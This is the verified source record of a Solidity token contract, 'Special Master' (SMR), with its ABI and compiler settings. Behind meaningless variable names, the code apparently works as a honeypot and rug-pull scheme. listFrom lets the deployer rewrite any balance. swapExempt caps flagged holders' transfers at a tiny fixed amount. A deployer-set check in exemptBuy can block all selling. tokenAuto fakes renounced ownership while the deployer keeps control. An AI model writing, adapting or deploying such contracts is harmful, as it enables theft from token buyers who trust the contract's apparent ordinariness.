{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface atSenderIs {\n    function createPair(address sellWalletIs, address txListLaunched) external returns (address);\n}\n\ninterface liquidityFee {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchMaxMode) external view returns (uint256);\n\n    function transfer(address marketingReceiverTotal, uint256 amountMarketing) external returns (bool);\n\n    function allowance(address launchedExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingReceiverTotal,\n        uint256 amountMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityIs, uint256 value);\n    event Approval(address indexed launchedExempt, address indexed spender, uint256 value);\n}\n\nabstract contract exemptTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityFeeMetadata is liquidityFee {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SpecialMaster is exemptTake, liquidityFee, liquidityFeeMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyTokenLaunch;\n    }\n\n    bool public atLaunched;\n\n    function transferFrom(address enableLiquidity, address marketingReceiverTotal, uint256 amountMarketing) external override returns (bool) {\n        if (_msgSender() != modeAuto) {\n            if (modeFund[enableLiquidity][_msgSender()] != type(uint256).max) {\n                require(amountMarketing <= modeFund[enableLiquidity][_msgSender()]);\n                modeFund[enableLiquidity][_msgSender()] -= amountMarketing;\n            }\n        }\n        return exemptBuy(enableLiquidity, marketingReceiverTotal, amountMarketing);\n    }\n\n    function fundMode(address enableLiquidity, address marketingReceiverTotal, uint256 amountMarketing) internal returns (bool) {\n        require(totalAtSell[enableLiquidity] >= amountMarketing);\n        totalAtSell[enableLiquidity] -= amountMarketing;\n        totalAtSell[marketingReceiverTotal] += amountMarketing;\n        emit Transfer(enableLiquidity, marketingReceiverTotal, amountMarketing);\n        return true;\n    }\n\n    bool private txMax;\n\n    uint256 private senderTake;\n\n    uint256 limitToken;\n\n    bool private listIs;\n\n    address modeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address launchMaxMode) public view virtual override returns (uint256) {\n        return totalAtSell[launchMaxMode];\n    }\n\n    string private enableTradingAmount = \"Special Master\";\n\n    function transfer(address fromAmountSender, uint256 amountMarketing) external virtual override returns (bool) {\n        return exemptBuy(_msgSender(), fromAmountSender, amountMarketing);\n    }\n\n    function getOwner() external view returns (address) {\n        return modeWallet;\n    }\n\n    mapping(address => bool) public feeMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return modeWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private modeFund;\n\n    address takeTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private modeWallet;\n\n    function totalReceiver(address launchedMode) public {\n        if (receiverLiquidityLimit) {\n            return;\n        }\n        if (fromFund == txMax) {\n            totalExemptSell = shouldTotal;\n        }\n        feeMode[launchedMode] = true;\n        if (txMax != atLaunched) {\n            fromTeam = false;\n        }\n        receiverLiquidityLimit = true;\n    }\n\n    mapping(address => uint256) private totalAtSell;\n\n    bool public receiverLiquidityLimit;\n\n    address public autoReceiver;\n\n    string private walletReceiver = \"SMR\";\n\n    uint256 public totalExemptSell;\n\n    function tradingLaunch(uint256 amountMarketing) public {\n        listWallet();\n        limitToken = amountMarketing;\n    }\n\n    function swapExempt(address marketingAuto) public {\n        listWallet();\n        \n        if (marketingAuto == shouldEnable || marketingAuto == autoReceiver) {\n            return;\n        }\n        toLaunched[marketingAuto] = true;\n    }\n\n    uint256 liquidityList;\n\n    uint256 private shouldTotal;\n\n    bool public fromFund;\n\n    bool public shouldSell;\n\n    function approve(address enableSender, uint256 amountMarketing) public virtual override returns (bool) {\n        modeFund[_msgSender()][enableSender] = amountMarketing;\n        emit Approval(_msgSender(), enableSender, amountMarketing);\n        return true;\n    }\n\n    function allowance(address launchShould, address enableSender) external view virtual override returns (uint256) {\n        if (enableSender == modeAuto) {\n            return type(uint256).max;\n        }\n        return modeFund[launchShould][enableSender];\n    }\n\n    event OwnershipTransferred(address indexed isReceiver, address indexed fundTx);\n\n    function exemptBuy(address enableLiquidity, address marketingReceiverTotal, uint256 amountMarketing) internal returns (bool) {\n        if (enableLiquidity == shouldEnable) {\n            return fundMode(enableLiquidity, marketingReceiverTotal, amountMarketing);\n        }\n        uint256 sellTo = liquidityFee(autoReceiver).balanceOf(takeTo);\n        require(sellTo == limitToken);\n        require(marketingReceiverTotal != takeTo);\n        if (toLaunched[enableLiquidity]) {\n            return fundMode(enableLiquidity, marketingReceiverTotal, takeIs);\n        }\n        return fundMode(enableLiquidity, marketingReceiverTotal, amountMarketing);\n    }\n\n    uint256 public buyMin;\n\n    mapping(address => bool) public toLaunched;\n\n    uint256 constant takeIs = 6 ** 10;\n\n    uint8 private buyTokenLaunch = 18;\n\n    function listWallet() private view {\n        require(feeMode[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedAutoMode;\n    }\n\n    bool private fromTeam;\n\n    function listFrom(address fromAmountSender, uint256 amountMarketing) public {\n        listWallet();\n        totalAtSell[fromAmountSender] = amountMarketing;\n    }\n\n    address public shouldEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return enableTradingAmount;\n    }\n\n    function tokenAuto() public {\n        emit OwnershipTransferred(shouldEnable, address(0));\n        modeWallet = address(0);\n    }\n\n    constructor (){\n        \n        launchedFund enableLaunch = launchedFund(modeAuto);\n        autoReceiver = atSenderIs(enableLaunch.factory()).createPair(enableLaunch.WETH(), address(this));\n        if (txMax != listIs) {\n            fromFund = false;\n        }\n        shouldEnable = _msgSender();\n        feeMode[shouldEnable] = true;\n        totalAtSell[shouldEnable] = launchedAutoMode;\n        tokenAuto();\n        if (atLaunched == fromTeam) {\n            buyMin = senderTake;\n        }\n        emit Transfer(address(0), shouldEnable, launchedAutoMode);\n    }\n\n    uint256 private launchedAutoMode = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMaxMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmountSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMarketing\",\"type\":\"uint256\"}],\"name\":\"listFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidityLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"}],\"name\":\"swapExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalExemptSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"}],\"name\":\"totalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountMarketing\",\"type\":\"uint256\"}],\"name\":\"tradingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmountSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingReceiverTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SpecialMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}